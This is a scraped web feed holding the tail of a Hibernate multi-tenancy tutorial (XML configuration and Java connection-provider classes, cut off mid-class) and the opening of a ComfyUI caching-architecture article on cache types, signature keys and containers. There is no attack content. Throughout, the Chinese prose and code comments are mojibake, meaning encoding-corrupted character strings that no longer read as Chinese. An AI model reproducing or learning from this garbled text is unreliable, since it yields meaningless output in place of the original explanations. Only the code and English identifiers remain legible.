<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_default_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- å¤šç§Ÿæˆ·é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multiTenancy"</span>&gt;</span>DATABASE<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.tenant_identifier_resolver"</span>&gt;</span>com.example.TenantIdentifierResolverImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multi_tenant_connection_provider"</span>&gt;</span>com.example.MultiTenantConnectionProviderImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-8">å®ç°<code>MultiTenantConnectionProvider</code>æ¥å£</h4>
<p>å®ç°<code>MultiTenantConnectionProvider</code>æ¥å£ï¼Œç”¨äºæä¾›åŸºäºç§Ÿæˆ·çš„è¿æ¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.engine.jdbc.connections.spi.MultiTenantConnectionProvider;
<span class="hljs-keyword">import</span> org.hibernate.service.spi.Stoppable;

<span class="hljs-keyword">import</span> javax.sql.DataSource;
<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantConnectionProviderImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultiTenantConnectionProvider</span>, Stoppable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, DataSource&gt; dataSources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTenantConnectionProviderImpl</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆå§‹åŒ–å„ä¸ªç§Ÿæˆ·çš„æ•°æ®æº</span>
        dataSources.put(<span class="hljs-string">"tenant1"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://localhost:3306/tenant1"</span>, <span class="hljs-string">"username"</span>, <span class="hljs-string">"password"</span>));
        dataSources.put(<span class="hljs-string">"tenant2"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://localhost:3306/tenant2"</span>, <span class="hljs-string">"username"</span>, <span class="hljs-string">"password"</span>));
        <span class="hljs-comment">// ... add other tenants</span>
    }

    <span class="hljs-keyword">private</span> DataSource <span class="hljs-title function_">createDataSource</span><span class="hljs-params">(String url, String username, String password)</span> {
        <span class="hljs-type">DataSourceBuilder</span> <span class="hljs-variable">dataSourceBuilder</span> <span class="hljs-operator">=</span> DataSourceBuilder.create();
        dataSourceBuilder.url(url);
        dataSourceBuilder.username(username);
        dataSourceBuilder.password(password);
        <span class="hljs-keyword">return</span> dataSourceBuilder.build();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getAnyConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> dataSources.get(<span class="hljs-string">"tenant1"</span>).getConnection(); <span class="hljs-comment">// é»˜è®¤ç§Ÿæˆ·è¿æ¥</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseAnyConnection</span><span class="hljs-params">(Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String tenantIdentifier)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> dataSources.get(tenantIdentifier);
        <span class="hljs-keyword">if</span> (dataSource != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> dataSource.getConnection();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HibernateException</span>(<span class="hljs-string">"Could not find data source for tenant "</span> + tenantIdentifier);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseConnection</span><span class="hljs-params">(String tenantIdentifier, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsAggressiveRelease</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// Implement other required methods...</span>
}
</code></pre>
<h4 data-id="heading-9">å®ç°<code>CurrentTenantIdentifierResolver</code>æ¥å£</h4>
<p>å®ç°<code>CurrentTenantIdentifierResolver</code>æ¥å£ï¼Œç”¨äºè§£æå½“å‰ç§Ÿæˆ·æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.context.spi.CurrentTenantIdentifierResolver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TenantIdentifierResolverImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CurrentTenantIdentifierResolver</span> {

  
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ComfyUI çš„ç¼“å­˜æ¶æ„å’Œå®ç°]]></title>    <link>https://juejin.cn/post/7597989474971484210</link>    <guid>https://juejin.cn/post/7597989474971484210</guid>    <pubDate>2026-01-22T04:12:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597989474971484210" data-draft-id="7597704040215937050" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ComfyUI çš„ç¼“å­˜æ¶æ„å’Œå®ç°"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-22T04:12:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½˜é”¦"/> <meta itemprop="url" content="https://juejin.cn/user/730549110707431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ComfyUI çš„ç¼“å­˜æ¶æ„å’Œå®ç°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/730549110707431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½˜é”¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:12:18.000Z" title="Thu Jan 22 2026 04:12:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å›´ç»• ComfyUIï¼Œå¤§å®¶è®¨è®ºæœ€å¤šçš„æ˜¯èŠ‚ç‚¹ã€å·¥ä½œæµã€ç®—åŠ›è¿™äº›ï¼ŒçœŸæ­£å»çœ‹ç¼“å­˜ç»†èŠ‚çš„äººå…¶å®ä¸å¤šã€‚ä½†åªè¦ä½ å¼€å§‹åœ¨ä¸€å°æœºå™¨ä¸Šå †å¤šä¸ªæ¨¡å‹ã€å¤šä¸ª LoRAã€å¤šä¸ª workflowï¼Œç¼“å­˜ç­–ç•¥å°±ä¼šç›´æ¥å†³å®šè¿™å‡ ä»¶äº‹ï¼š</p>
<ul>
<li>ä½ æ˜¯ç®—åŠ›æµªè´¹ï¼Œè¿˜æ˜¯æŠŠæ˜¾å­˜ / å†…å­˜ç”¨åœ¨åˆ€åˆƒä¸Šï¼›</li>
<li>å®¹å™¨ä¼šä¸ä¼šè«åå…¶å¦™ OOMï¼›</li>
<li>å·¥ä½œæµåˆ‡æ¢æ—¶ï¼Œæ˜¯â€œç§’çº§çƒ­èº«â€è¿˜æ˜¯â€œä»å¤´å†æ¥â€ã€‚</li>
</ul>
<p>è¿™ç¯‡æ–‡ç« åªåšä¸€ä»¶äº‹ï¼šæŠŠ ComfyUI å½“å‰çš„ç¼“å­˜æ¶æ„å’Œå®ç°è®²æ¸…æ¥šï¼Œé‡ç‚¹æ˜¯ä¸‰ç±»ç­–ç•¥ï¼ˆCLASSIC / LRU / RAM_PRESSUREï¼‰åœ¨ã€Œé”®æ€ä¹ˆç®—ã€ä»€ä¹ˆæ—¶å€™å‘½ä¸­ã€ä»€ä¹ˆæ—¶å€™è¿‡æœŸã€ä¸Šçš„å·®å¼‚ï¼Œä»¥åŠåœ¨å¤šæ¨¡å‹ã€å¤š LoRAã€å¤š workflow åœºæ™¯ä¸‹åº”è¯¥æ€ä¹ˆé€‰æ‹©ã€‚</p>
<h2 data-id="heading-0">1. æ•´ä½“æ¶æ„ï¼šä¸¤è·¯ç¼“å­˜ + å››ç§ç­–ç•¥</h2>
<p>å…ˆæŠŠæ•´ä½“ç»“æ„æ‹æ¸…æ¥šã€‚</p>
<h2 data-id="heading-1">1.1 ä¸¤ç±»ç¼“å­˜ï¼šoutputs å’Œ objects</h2>
<p>åœ¨æ‰§è¡Œä¸€ä¸ªå·¥ä½œæµçš„æ—¶å€™ï¼ŒComfyUI ç»´æŠ¤äº†ä¸¤ç±»ç¼“å­˜ï¼š</p>
<ul>
<li>outputsï¼š å­˜ä¸­é—´ç»“æœå’Œ UI è¾“å‡ºã€‚å‘½ä¸­æ—¶å¯ä»¥ç›´æ¥è·³è¿‡èŠ‚ç‚¹æ‰§è¡Œï¼Œè¿™éƒ¨åˆ†æ˜¯çœŸæ­£çœè®¡ç®—çš„åœ°æ–¹ã€‚</li>
<li>objectsï¼š å­˜èŠ‚ç‚¹å¯¹è±¡å®ä¾‹ï¼ˆç±»å®ä¾‹ï¼‰ï¼Œé¿å…æ¯æ¬¡é‡æ–°æ„é€ èŠ‚ç‚¹å¯¹è±¡ã€‚</li>
</ul>
<p>è¿™ä¸¤ç±»ç¼“å­˜ç”±ä¸€ä¸ªç»Ÿä¸€çš„é›†åˆç±» CacheSet æ¥ç®¡ç†ã€‚æ ¸å¿ƒç»“æ„åœ¨ execution.py ä¸­ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">class CacheType(Enum):
    <span class="hljs-attr">CLASSIC</span> = <span class="hljs-number">0</span>
    <span class="hljs-attr">LRU</span> = <span class="hljs-number">1</span>
    <span class="hljs-attr">NONE</span> = <span class="hljs-number">2</span>
    <span class="hljs-attr">RAM_PRESSURE</span> = <span class="hljs-number">3</span>

class CacheSet:
    def __init__(self, <span class="hljs-attr">cache_type</span>=None, cache_args={}):
        if <span class="hljs-attr">cache_type</span> == CacheType.NONE:
            self.init_null_cache()
        elif <span class="hljs-attr">cache_type</span> == CacheType.RAM_PRESSURE:
            <span class="hljs-attr">cache_ram</span> = cache_args.get(<span class="hljs-string">"ram"</span>, <span class="hljs-number">16.0</span>)
            self.init_ram_cache(cache_ram)
        elif <span class="hljs-attr">cache_type</span> == CacheType.LRU:
            <span class="hljs-attr">cache_size</span> = cache_args.get(<span class="hljs-string">"lru"</span>, <span class="hljs-number">0</span>)
            self.init_lru_cache(cache_size)
        else:
            self.init_classic_cache()
        <span class="hljs-attr">self.all</span> = [self.outputs, self.objects]
</code></pre>
<p>ä¸ç®¡æ˜¯å“ªç§ç­–ç•¥ï¼Œç»“æ„éƒ½æ˜¯ï¼š</p>
<ul>
<li>outputsï¼šæŒ‰è¾“å…¥ç­¾ååš keyï¼›</li>
<li>objectsï¼šæŒ‰ (node_id, class_type) åš keyã€‚</li>
</ul>
<h2 data-id="heading-2">1.2 å››ç§ç­–ç•¥ï¼šCLASSIC / LRU / RAM_PRESSURE / NONE</h2>
<p>ä»å¯åŠ¨å‚æ•°åˆ°ç¼“å­˜ç­–ç•¥çš„é€‰æ‹©ï¼Œå¤§è‡´æ˜¯è¿™æ ·çš„ä¼˜å…ˆçº§ï¼ˆåœ¨ main.py ä¸­ï¼‰ï¼š</p>
<ul>
<li>æŒ‡å®š --cache-lru â†’ ç”¨ LRUï¼›</li>
<li>å¦åˆ™æŒ‡å®š --cache-ram â†’ ç”¨ RAM_PRESSUREï¼›</li>
<li>å¦åˆ™æŒ‡å®š --cache-none â†’ å®Œå…¨å…³é—­ç¼“å­˜ï¼›</li>
<li>éƒ½æ²¡æŒ‡å®š â†’ é»˜è®¤ CLASSICã€‚</li>
</ul>
<p>CacheType çš„å®šä¹‰å‰é¢å·²ç»è´´äº†ã€‚ä¸åŒç­–ç•¥åªå†³å®š outputs çš„å®ç°æ–¹å¼ï¼Œè€Œ objects åŸºæœ¬å§‹ç»ˆä½¿ç”¨å±‚çº§ç¼“å­˜ HierarchicalCache(CacheKeySetID)ï¼Œåé¢ç»†è®²ã€‚</p>
<hr/>
<h2 data-id="heading-3">2. ç¼“å­˜é”®ï¼šè¾“å…¥ç­¾å + å˜åŒ–æŒ‡çº¹</h2>
<p>ç¼“å­˜æ˜¯å¦å‘½ä¸­ï¼Œé¦–å…ˆå–å†³äºâ€œkey ç®—å¾—æ˜¯å¦åˆç†â€ã€‚ComfyUI çš„è®¾è®¡æ ¸å¿ƒæ˜¯ï¼š</p>
<ul>
<li>è¾“å‡ºç¼“å­˜ï¼ˆoutputsï¼‰ï¼šç”¨â€œè¾“å…¥ç­¾å + is_changed æŒ‡çº¹ï¼ˆ+ æŸäº›æƒ…å†µä¸‹çš„ node_idï¼‰â€ä½œä¸º keyï¼›</li>
<li>å¯¹è±¡ç¼“å­˜ï¼ˆobjectsï¼‰ï¼šç”¨ (node_id, class_type) ä½œä¸º keyã€‚</li>
</ul>
<h2 data-id="heading-4">2.1 è¾“å‡ºç¼“å­˜ï¼šè¾“å…¥ç­¾åæ˜¯æ€ä¹ˆæ¥çš„</h2>
<p>è¾“å‡ºé”®çš„ç”Ÿæˆç”± CacheKeySetInputSignature è´Ÿè´£ï¼Œæ ¸å¿ƒé€»è¾‘åœ¨ comfy_execution/caching.py:100-126ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_node_signature</span>(<span class="hljs-params">self, dynprompt, node_id</span>):
    signature = []
    ancestors, order_mapping = self.get_ordered_ancestry(dynprompt, node_id)
    signature.append(<span class="hljs-keyword">await</span> self.get_immediate_node_signature(dynprompt, node_id,
    order_mapping))
    <span class="hljs-keyword">for</span> ancestor_id <span class="hljs-keyword">in</span> ancestors:
        signature.append(<span class="hljs-keyword">await</span> self.get_immediate_node_signature(dynprompt,
        ancestor_id, order_mapping))
    <span class="hljs-keyword">return</span> to_hashable(signature)
</code></pre>
<p>è¿™é‡Œæœ‰å‡ ä¸ªç‚¹ï¼š</p>
<ol>
<li>ä¸åªçœ‹å½“å‰èŠ‚ç‚¹ï¼š å®ƒä¼šæŒ‰æ‹“æ‰‘é¡ºåºæŠŠâ€œå½“å‰èŠ‚ç‚¹ + æ‰€æœ‰ç¥–å…ˆâ€çš„ç­¾åæ‹¼åœ¨ä¸€èµ·ã€‚è¿™ä¿è¯äº†åªè¦æ•´ä¸ªå­å›¾çš„æ‹“æ‰‘å’Œè¾“å…¥ä¸€è‡´ï¼Œè¾“å‡ºå°±èƒ½å‘½ä¸­ç¼“å­˜ã€‚</li>
<li>immediate ç­¾ååŒ…å«ä»€ä¹ˆï¼š get_immediate_node_signature ä¼šæŠŠè¿™äº›ä¿¡æ¯æ‰“åŒ…è¿›å»ï¼ˆä½ç½®è§åŒæ–‡ä»¶ 108â€“126ï¼‰ï¼š</li>
</ol>
<ul>
<li>class_typeï¼šèŠ‚ç‚¹ç±»å‹ï¼›</li>
<li>is_changed æŒ‡çº¹ï¼ˆé€šè¿‡ fingerprint_inputs/IS_CHANGEDï¼‰ï¼›</li>
<li>å¿…è¦æ—¶çš„ node_idï¼›</li>
<li>æœ‰åºçš„è¾“å…¥å€¼/é“¾æ¥ã€‚</li>
</ul>
<ol>
<li>ä»€ä¹ˆæ—¶å€™æŠŠ node_id ä¹Ÿç®—è¿› keyï¼š å½“èŠ‚ç‚¹è¢«å£°æ˜ä¸ºéå¹‚ç­‰ï¼Œæˆ–è€…å†…éƒ¨æœ‰ UNIQUE_ID è¿™ç§éšå«è¾“å…¥æ—¶ï¼Œä¼šæŠŠ node_id åŠ è¿›ç­¾åï¼ˆè§ comfy_execution/caching.py:18-23, 116ï¼‰ï¼Œé¿å…â€œçœ‹èµ·æ¥ä¸€æ ·â€çš„èŠ‚ç‚¹è¢«é”™è¯¯å¤ç”¨ã€‚</li>
</ol>
<p>æœ€åé€šè¿‡ to_hashable è½¬æˆå¯å“ˆå¸Œç»“æ„ï¼ˆtuple/frozenset ç­‰ï¼‰ï¼Œä½œä¸ºæœ€ç»ˆé”®å€¼ã€‚</p>
<p>ç»“æœæ˜¯ï¼š</p>
<ul>
<li>è¾“å…¥å®Œå…¨ç›¸åŒ â†’ key ç›¸åŒ â†’ ç›´æ¥å‘½ä¸­ï¼›</li>
<li>ä»»æ„ä¸€ä¸ªä¸Šæ¸¸èŠ‚ç‚¹è¾“å…¥æˆ–å‚æ•°å˜åŒ– â†’ æŒ‡çº¹å˜äº† â†’ key ä¸åŒ â†’ ä¸ä¼šå¤ç”¨æ—§ç»“æœã€‚</li>
</ul>
<h2 data-id="heading-5">2.2 å¯¹è±¡ç¼“å­˜ï¼šç”¨ (node_id, class_type)</h2>
<p>èŠ‚ç‚¹å¯¹è±¡çš„é”®ç”± CacheKeySetID æ„é€ ï¼ˆcomfy_execution/caching.py:66-80ï¼‰ï¼Œé€»è¾‘ç®€å•ï¼š</p>
<ul>
<li>key = (node_id, class_type)ã€‚</li>
</ul>
<p>è¯»å–æ—¶ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj</span> = caches.objects.get(unique_id)
if obj is None:
    <span class="hljs-attr">obj</span> = class_def()
    caches.objects.set(unique_id, obj)
</code></pre>
<p>å¯¹è±¡ç¼“å­˜å­˜åœ¨çš„ç›®çš„åªæœ‰ä¸€ä¸ªï¼šåŒä¸€ä¸ª workflow æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¸è¦é‡å¤ new èŠ‚ç‚¹å®ä¾‹ã€‚</p>
<hr/>
<h2 data-id="heading-6">3. ç¼“å­˜å®¹å™¨ï¼šBasic / Hierarchical / LRU / RAM / Null</h2>
<p>æœ‰äº† keyï¼Œè¿˜éœ€è¦ä¸€ä¸ªåˆç†çš„ã€Œå®¹å™¨ã€å’Œã€Œé©±é€ç­–ç•¥ã€ã€‚</p>
<p>ä¸»è¦ç±»åœ¨ comfy_execution/caching.pyï¼š</p>
<ul>
<li>BasicCacheï¼šåŸºç¡€å®¹å™¨ï¼Œæä¾› set_prompt / clean_unused / get / set ç­‰ï¼›</li>
<li>HierarchicalCacheï¼šæŒ‰â€œçˆ¶èŠ‚ç‚¹ â†’ å­å›¾â€æ„å»ºå±‚çº§ç¼“å­˜ï¼›</li>
<li>LRUCacheï¼šåœ¨ Basic + Hierarchical çš„åŸºç¡€ä¸Šå¢åŠ ä»£é™… LRUï¼›</li>
<li>RAMPressureCacheï¼šåœ¨ LRU çš„åŸºç¡€ä¸Šå¢åŠ  RAM å‹åŠ›é©±é€ï¼›</li>
<li>NullCacheï¼šç©ºå®ç°ï¼ˆç¦ç”¨ç¼“å­˜ï¼‰ã€‚</li>
</ul>
<p>æ ¸å¿ƒæ¥å£ç»Ÿä¸€åœ¨ BasicCacheï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">clean_unused</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):
    <span class="hljs-variable language_">self</span>._clean_cache()
    <span class="hljs-variable language_">self</span>._clean_subcaches()
</code></pre>
<p>å±‚çº§ç›¸å…³é€»è¾‘åœ¨ HierarchicalCacheï¼Œç”¨æ¥æ”¯æŒâ€œå­å›¾å•ç‹¬åˆ†åŒºç¼“å­˜â€ã€‚</p>
<h2 data-id="heading-7">3.1 å±‚çº§ç¼“å­˜ï¼šæ€ä¹ˆå®šä½åˆ°æŸä¸ªèŠ‚ç‚¹çš„åˆ†åŒº</h2>
